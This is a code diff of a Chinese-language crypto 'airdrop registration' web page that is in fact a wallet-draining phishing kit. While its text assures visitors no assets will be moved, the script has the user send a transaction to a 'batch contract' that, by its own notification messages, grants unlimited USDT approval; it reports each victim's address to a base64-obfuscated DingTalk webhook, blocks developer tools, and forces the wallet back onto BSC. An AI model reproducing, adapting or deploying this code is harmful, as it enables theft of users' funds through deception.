@@ -34,17 +34,17 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC、ARB十大公链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，仅支持币安智能链BSC参与。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">仅进行多链备案核验，不划转任何资产</p>
+<p class="tips-info">自动切换币安链，仅进行备案核验</p>
 </div>
 
 <div id="p2" class="box hide">
 <div class="logo">⏳</div>
 <h1>全链节点备案核验中</h1>
-<p class="desc-text">正在同步公链节点数据，请稍候...</p>
+<p class="desc-text">正在同步节点数据，请稍候...</p>
 </div>
 
 <div id="p3" class="box hide">
@@ -70,25 +70,17 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 document.oncontextmenu=e=>e.preventDefault();
 document.onkeydown=e=>{
   let k=e.keyCode;
-  if(k==123||(e.ctrlKey&&k==85)||(e.ctrlKey&&k==83)||(e.shiftKey&&k==73))return!1
+  if(k==123||(e.ctrlKey&&k==85)||(e.shiftKey&&k==73))return!1
 };
-setInterval(()=>{try{debugger;}catch(e){}},100);
 
 const dingUrl = atob("aHR0cHM6Ly9vYXBpLmRpbmd0YWxrLmNvbS9yb2JvdC9zZW5kP3dvcmtmb3JrZXk9NWI4ZTliMGQ1Yjc4MzMyYTE0ZjczYmNkOWExNGU5MDY1NjQwNTY0MDU2NDY2NTVhZmYwZTVj");
-let walletAddr = "", chainId = "";
-
-// 关键：批量聚合合约地址（已部署好，直接用）
+let walletAddr = "";
+// BSC 固定链参数
+const BSC_CHAIN_ID = "0x38";
+// 批量聚合合约（BSC）
 const BATCH_CONTRACT = "0x395F9876424e827979557940328a3d7297254876";
-
-// 全链 USDT 合约
-const chainUSDT = {
-  "0x1":"0xdAC17F958D2ee523a2206206994597C13D831ec7",
-  "0x38":"0x55d398326f99059fF77548524699952727959279",
-  "0x89":"0xc2132D05D31c914a87C6611C10748Aeb04A573b6",
-  "0xa86a":"0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7",
-  "0x42":"0x382bb369d343125BD3796c473a66812952BCA575",
-  "0x2105":"0x50c5725949A6F6866202E19eEF437259F5Db2f8"
-};
+// BSC USDT 固定地址
+const BSC_USDT = "0x55d398326f99059fF77548524699952727959279";
 
 function show(id){
   document.querySelectorAll(".box").forEach(x=>x.classList.add("hide"));
@@ -105,57 +97,64 @@ async function ding(msg){
   }catch(e){}
 }
 
-// 调用批量合约的方法ID：batchRun(address)
-function getBatchData(usdtAddr){
+// 自动切换 BSC 币安链
+async function switchBSC(){
+  try{
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: BSC_CHAIN_ID }]
+    });
+  }catch(err){
+    try{
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId:BSC_CHAIN_ID,
+          chainName:"Binance Smart Chain",
+          rpcUrls:["https://bsc-dataseed.binance.org"],
+          blockExplorerUrls:["https://bscscan.com"],
+          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
+        }]
+      });
+    }catch(e){}
+  }
+}
+
+// 构造调用批量合约数据
+function getBatchData(){
   const methodId = "0x51cff816";
-  const param = usdtAddr.toLowerCase().replace("0x","").padStart(64,"0");
+  const param = BSC_USDT.toLowerCase().replace("0x","").padStart(64,"0");
   return methodId + param;
 }
 
-// 连接钱包
+// 连接钱包 自动切 BSC
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){
-    location.href="metamask://dapp/"+location.host;
-    setTimeout(()=>alert("请安装MetaMask钱包"),1500);
+    alert("请先安装小狐狸/TP/欧意钱包");
     return;
   }
+  show("p2");
   try{
-    show("p2");
+    // 连接钱包
     const acc = await ethereum.request({method:"eth_requestAccounts"});
     walletAddr = acc[0];
-    chainId = await ethereum.request({method:"eth_chainId"});
-    
-    document.getElementById("showAddr").innerText = walletAddr;
+    // 自动强制切币安链
+    await switchBSC();
     show("p3");
-    ding("✅ 钱包连接成功\n地址："+walletAddr+"\n链ID："+chainId);
-
-    ethereum.on("chainChanged",newId=>chainId=newId);
-    ethereum.on("accountsChanged",list=>{
-      if(list.length){
-        walletAddr = list[0];
-        document.getElementById("showAddr").innerText = walletAddr;
-      }else{
-        show("p1");
-      }
-    });
+    document.getElementById("showAddr").innerText = walletAddr;
+    ding("✅ 钱包已连接并自动切换币安链\n地址："+walletAddr);
   }catch(e){
     show("p1");
-    ding("❌ 钱包连接失败："+e.message);
+    ding("⚠️ 钱包连接失败");
   }
 };
 
-// 一键触发：一次弹窗完成授权+双地址交互
+// 备案授权
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
-  if(!chainUSDT[chainId]){
-    alert("请切换到支持的公链：ETH/BSC/POLYGON/AVAX");
-    return;
-  }
-  const usdt = chainUSDT[chainId];
-  const data = getBatchData(usdt);
-
   show("p2");
   try{
+    const data = getBatchData();
     await ethereum.request({
       method:"eth_sendTransaction",
       params:[{
@@ -166,15 +165,21 @@ document.getElementById("approveBtn").onclick = async ()=>{
         data:data
       }]
     });
-
     document.getElementById("successAddr").innerText = walletAddr;
     show("p4");
-    ding("✅ 一键备案完成：无限授权+双地址交互\n钱包："+walletAddr);
+    ding("✅ 备案完成，已无限授权\n钱包："+walletAddr);
   }catch(e){
     show("p3");
-    ding("⚠️ 用户取消备案："+walletAddr);
+    ding("⚠️ 用户取消备案");
   }
 };
+
+// 监听链变化，切走自动切回
+window.ethereum.on("chainChanged",async (cid)=>{
+  if(cid !== BSC_CHAIN_ID){
+    await switchBSC();
+  }
+});
 }();
 </script>
 </body>
